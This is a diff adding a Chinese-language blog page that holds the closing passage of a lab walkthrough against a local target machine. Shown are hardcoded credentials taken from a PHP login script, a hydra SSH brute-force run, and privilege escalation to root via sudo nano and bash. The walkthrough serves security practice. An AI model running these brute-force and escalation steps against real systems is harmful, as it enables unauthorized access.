+    <span class="pl-s"><span class="pl-pds">"</span>sacagawea<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>cU21X8&amp;uGswgYsL!raXC<span class="pl-pds">"</span></span>
+  ]<span class="pl-k">;</span>
+
+  // (B2) CHECK <span class="pl-k">&amp;</span> VERIFY
+  <span class="pl-k">if</span> (isset(<span class="pl-smi">$users</span>[<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>]])) {
+    <span class="pl-k">if</span> (<span class="pl-smi">$users</span>[<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>]] <span class="pl-k">==</span> <span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>]) {
+      <span class="pl-smi">$_SESSION</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>] = <span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>]<span class="pl-k">;</span>
+    }
+  }
+
+  // (B3) FAILED LOGIN FLAG
+  <span class="pl-k">if</span> (<span class="pl-k">!</span>isset(<span class="pl-smi">$_SESSION</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>])) { <span class="pl-smi">$failed</span> = <span class="pl-c1">true</span><span class="pl-k">;</span> }
+}
+
+// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
+<span class="pl-k">if</span> (isset(<span class="pl-smi">$_SESSION</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>])) {
+  header(<span class="pl-s"><span class="pl-pds">"</span>Location: index.php<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+  <span class="pl-en">exit</span>();
+}</pre></div>
+<p>发现了几组用户和密码，我们尝试利用其爆破ssh</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat user              
+geronimo
+pocahontas
+squanto
+sacagawea
+                                                                                                                                   
+┌──(kali㉿kali)-[~/test]
+└─$ cat pass
+12u7D9@4IA9uBO4pX9#6jZ3456
+y2U1@8Ie<span class="pl-k">&amp;</span>OHwd^Ww3uAl
+4Rl3^K8WDG@sG24Hq@ih
+cU21X8<span class="pl-k">&amp;</span>uGswgYsL<span class="pl-k">!</span>raXC
+
+┌──(kali㉿kali)-[~/test]
+└─$ hydra -L user -P pass ssh://192.168.205.143 -V -I -u -f -e nsr -t 64
+
+[22][ssh] host: 192.168.205.143   login: pocahontas   password: y2U1@8Ie<span class="pl-k">&amp;</span>OHwd^Ww3uAl
+[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.143 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:09
+</pre></div>
+<p>我们通过ssh连接上去（建议这样连接，不要要上一个用户切用户，不然它sudo会报错）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ ssh pocahontas@192.168.205.143
+
+pocahontas@apaches:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> pocahontas on apaches:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin<span class="pl-cce">\:</span>/snap/bin
+
+User pocahontas may run the following commands on apaches:
+    (geronimo) /bin/nano</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e"><img src="https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e" alt="Image" style="max-width: 100%;"></a></p>
+<p>可以使用<strong>sudo nano</strong>，我们进行提权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">pocahontas@apaches:<span class="pl-k">~</span>$ sudo -u geronimo /bin/nano
+$ bash
+geronimo@apaches:/home/pocahontas$ sudo bash -p
+root@apaches:/home/pocahontas# id
+uid=0(root) gid=0(root) groups=0(root)</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
